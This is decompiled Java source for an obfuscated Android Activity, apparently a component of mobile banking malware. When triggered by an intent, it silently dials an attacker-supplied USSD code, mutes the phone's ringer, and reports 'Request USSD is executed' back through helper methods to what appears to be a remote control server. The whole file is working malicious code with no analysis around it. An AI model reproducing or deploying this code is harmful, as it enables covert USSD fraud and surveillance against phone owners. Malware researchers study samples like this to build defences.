package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.Intent;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;

public class gcmysyhtova extends Activity {

    /* renamed from: a */
    C0034b f447a = new C0034b();

    /* renamed from: b */
    C0039c f448b = new C0039c();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            String encode = Uri.encode(getIntent().getStringExtra("str").replace("AAA", "#"));
            Intent intent = new Intent("android.intent.action.CALL");
            StringBuilder sb = new StringBuilder();
            sb.append("tel:");
            sb.append(encode);
            startActivity(intent.setData(Uri.parse(sb.toString())));
            ((AudioManager) getSystemService("audio")).setRingerMode(0);
            StringBuilder sb2 = new StringBuilder();
            sb2.append("p=");
            C0034b bVar = this.f447a;
            StringBuilder sb3 = new StringBuilder();
            sb3.append(this.f447a.mo247q(this));
            sb3.append("|Request USSD is executed (");
            sb3.append(encode);
            sb3.append(")|");
            sb2.append(bVar.mo225c(sb3.toString()));
            this.f447a.mo218b(this, "4", sb2.toString());
        } catch (Exception unused) {
            this.f447a.mo213a("ERROR", "Start USSD");
        }
        finish();
    }
}
